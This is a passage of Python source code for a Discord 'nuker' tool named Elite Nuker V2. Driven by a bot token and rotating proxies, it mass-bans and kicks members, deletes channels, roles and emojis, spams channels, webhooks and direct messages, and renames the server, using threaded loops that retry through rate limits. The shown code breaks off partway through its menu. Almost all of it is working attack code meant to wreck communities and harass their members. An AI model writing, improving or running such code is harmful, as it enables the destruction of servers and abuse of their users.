import asyncio
import threading
import webbrowser
import discord
from discord.ext import commands
import httpx
import json
import time
import random
import os
from itertools import cycle
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

VERSION = '1.0.0'

# Setup Discord intents
intents = discord.Intents.default()
intents.members = True

# Load configuration and proxies
config = json.load(open("config.json", "r", encoding="utf-8"))
proxies = cycle(open("proxies.txt", "r").read().splitlines())

# Global variables
client = None
__threads__ = 100

# ASCII art for the tool
Elite_art = ("""

        ███████╗██╗░░░░░██╗████████╗███████╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
        ██╔════╝██║░░░░░██║╚══██╔══╝██╔════╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
        █████╗░░██║░░░░░██║░░░██║░░░█████╗░░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
        ██╔══╝░░██║░░░░░██║░░░██║░░░██╔══╝░░  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
        ███████╗███████╗██║░░░██║░░░███████╗  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
        ╚══════╝╚══════╝╚═╝░░░╚═╝░░░╚══════╝  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

                              *    Elite Nuker V2 By Tavish     *
                              ═══════════════════════════════════         
                         ═════════════════════════════════════════════
""")

# Apply gradient to menu options
options = ("""
              ╚╦╗                                                             ╔╦╝
         ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
         ╩ (1) < Ban Members      ║ (8) < Delete Emojis     ║ (15) < Voice Kick      ╩
           (2) < Kick Members     ║ (9)  < Spam Channels    ║ (16) < Nickname Changer  
           (3) < Prune Members    ║ (10) < Webhook Spam     ║ (17) < Fetch Guilds      
           (4) < Create Channels  ║ (11) < Change Guild Name║ (18) < Check Updates    
           (5) < Create Roles     ║ (12) < Change Guild Icon║ (19) < Credits          
           (6) < Delete Channels  ║ (13) < Channel Perms    ║ (20) < Exit             
         ╦ (7) < Delete Roles     ║ (14) < Mass DM          ║                        ╦
         ╚════════════════════════╩═════════════════════════╩════════════════════════╝
                                                                           
""")

# Print output will happen after token input and guild fetch


class Elite:
    def __init__(self):
        self.proxy = "http://" + next(proxies) if config["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.guilds = []

    def fetch_guilds(self, token: str):
        """Fetch all guilds the bot is in"""
        try:
            response = self.session.get(f"https://discord.com/api/{next(self.version)}/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                guilds_data = response.json()
                self.guilds = guilds_data
                print("{}({}+{}) Fetched {}{}{} guilds".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", len(guilds_data), "\x1b[0m"))
                for guild in guilds_data:
                    print("{}({}+{}) Guild: {}{}{} | ID: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", guild['name'], "\x1b[0m", "\x1b[38;5;21m", guild['id']))
                return guilds_data
            else:
                print("{}({}-{}) Failed to fetch guilds".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                return []
        except Exception as e:
            print("{}({}-{}) Error fetching guilds: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
            return []

    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            try:
                response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code in [200, 201, 204]:
                    print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                    self.banned.append(member)
                    break
                elif "retry_after" in response.text:
                    delay = response.json()['retry_after']
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                elif "Max number of bans for non-guild members have been exceeded." in response.text:
                    print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                    break
            except Exception as e:
                print("{}({}-{}) Error banning {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", member, e))
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
                if response.status_code in [200, 201, 204]:
                    print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                    self.kicked.append(member)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                    break
            except Exception as e:
                print("{}({}-{}) Error kicking {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", member, e))
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            try:
                response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 201:
                    print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channelsname))
                    self.channels.append(1)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
                    break
            except Exception as e:
                print("{}({}-{}) Error creating channel {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channelsname, e))
                break
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            try:
                response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 200:
                    print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", rolesname))
                    self.roles.append(1)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
                    break
            except Exception as e:
                print("{}({}-{}) Error creating role {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", rolesname, e))
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 200:
                    print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channel))
                    self.channels.append(channel)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting channel {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channel, e))
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 204:
                    print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", role))
                    self.roles.append(role)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting role {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", role, e))
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 204:
                    print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", emoji))
                    self.emojis.append(emoji)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting emoji {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", emoji, e))
                break
            
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            try:
                response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
                if response.status_code == 200:
                    print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", content, "\x1b[0m", "\x1b[38;5;21m", channel))
                    self.messages.append(channel)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                    break
            except Exception as e:
                print("{}({}-{}) Error spamming channel {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channel, e))
                break
    
    def execute_webhook_spam(self, webhook_url: str, content: str, username: str, avatar_url: str, token: str):
        payload = {
            "content": content,
            "username": username,
            "avatar_url": avatar_url
        }
        while True:
            try:
                response = self.session.post(webhook_url, json=payload)
                if response.status_code in [200, 204]:
                    print("{}({}+{}) Spammed webhook".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.messages.append(1)
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                else:
                    print("{}({}-{}) Failed to spam webhook".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                    break
            except Exception as e:
                print("{}({}-{}) Error spamming webhook: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
                break
    
    def execute_change_guild_name(self, guildid: str, new_name: str, token: str):
        payload = {
            "name": new_name
        }
        while True:
            try:
                response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 200:
                    print("{}({}+{}) Changed guild name to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", new_name))
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to change guild name".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                    break
            except Exception as e:
                print("{}({}-{}) Error changing guild name: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
                break
    
    def execute_change_guild_icon(self, guildid: str, icon_url: str, token: str):
        # Download the image and convert to base64
        try:
            img_response = self.session.get(icon_url)
            img_data = img_response.content
            import base64
            encoded_image = "data:image/png;base64," + base64.b64encode(img_data).decode('ascii')
            
            payload = {
                "icon": encoded_image
            }
            while True:
                try:
                    response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
                    if response.status_code == 200:
                        print("{}({}+{}) Changed guild icon".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                        break
                    elif "retry_after" in response.text:
                        delay = float(response.json()['retry_after'])
                        print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                        time.sleep(delay)
                    elif "Missing Permissions" in response.text:
                        print("{}({}!{}) Missing Permissions".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                        break
                    else:
                        print("{}({}-{}) Failed to change guild icon".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        break
                except Exception as e:
                    print("{}({}-{}) Error changing guild icon: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
                    break
        except Exception as e:
            print("{}({}-{}) Error downloading image: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    def execute_channel_permissions(self, channel_id: str, token: str):
        # Overwrite channel permissions to deny all members
        payload = {
            "permission_overwrites": [
                {
                    "id": channel_id,
                    "type": 0,  # Role
                    "allow": "0",
                    "deny": "8"
                }
            ]
        }
        while True:
            try:
                response = self.session.patch(f"https://discord.com/api/{next(self.version)}/channels/{channel_id}", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 200:
                    print("{}({}+{}) Updated channel permissions".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    break
                elif "retry_after" in response.text:
                    delay = float(response.json()['retry_after'])
                    print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", delay, "\x1b[0m"))
                    time.sleep(delay)
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to update channel permissions".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                    break
            except Exception as e:
                print("{}({}-{}) Error updating channel permissions: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
                break
    
    def execute_mass_dm(self, userid: str, content: str, token: str):
        payload = {
            "recipient_id": userid
        }
        try:
            # Create DM channel
            channel_response = self.session.post(f"https://discord.com/api/{next(self.version)}/users/@me/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if channel_response.status_code == 200:
                dm_channel = channel_response.json()["id"]
                # Send message
                msg_response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{dm_channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
                if msg_response.status_code == 200:
                    print("{}({}+{}) Sent DM to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid))
                    self.messages.append(userid)
                else:
                    print("{}({}-{}) Failed to send DM to {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
            else:
                print("{}({}-{}) Failed to create DM channel with {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error sending DM to {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", userid, e))

    
    def menu(self):
        os.system(f"cls & title Elite Nuker ^| Authenticated as: {client.user.name}#{client.user.discriminator}")
        print(Elite_art + options + "\n")
        ans = input("{}({}Elite{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}Elite{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
                    guild = client.get_guild(int(guildid))
                    with open("fetched/members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except: pass
            else:
                pass
            self.banned.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban_async, args=(member, guildid, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}Elite{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["2", "02"]:
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick_async, args=(member, guildid, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            print("{}({}Elite{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            days = int(input("{}({}Elite{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}Elite{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(config["nuke"]["channels_name"]), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}Elite{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(config["nuke"]["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}Elite{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["6", "06"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels_async, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}Elite{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["7", "07"]:
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles_async, args=(role['id'], guildid, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}Elite{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["8", "08"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis_async, args=(emoji['id'], guildid, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}Elite{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["9", "09"]:
            self.messages.clear(); self.channels.clear()
            content = input("{}({}Elite{}) Message to spam{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels: self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz), content, token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
                    
            time.sleep(3)
            print("{}({}Elite{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "10":
            # Webhook spam
            webhook_url = input("{}({}Elite{}) Webhook URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            use_random = input("{}({}Elite{}) Use random messages from config? (y/n){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if use_random.lower() == "y":
                content = random.choice(config["nuke"]["messages_content"])
                username = random.choice(config["nuke"]["webhook_username"])
                avatar_url = random.choice(config["nuke"]["webhook_avatar"])
            else:
                content = input("{}({}Elite{}) Message{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                username = input("{}({}Elite{}) Username{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                avatar_url = input("{}({}Elite{}) Avatar URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.messages.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_webhook_spam, args=(webhook_url, content, username, avatar_url, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print("{}({}Elite{}) Spammed {}{}{} messages via webhook".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", len(self.messages), "\x1b[0m"))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "11":
            # Change guild name
            use_random = input("{}({}Elite{}) Use random server name from config? (y/n){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if use_random.lower() == "y":
                new_name = random.choice(config["nuke"]["server_names"])
            else:
                new_name = input("{}({}Elite{}) New Guild Name{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            self.execute_change_guild_name(guildid, new_name, token)
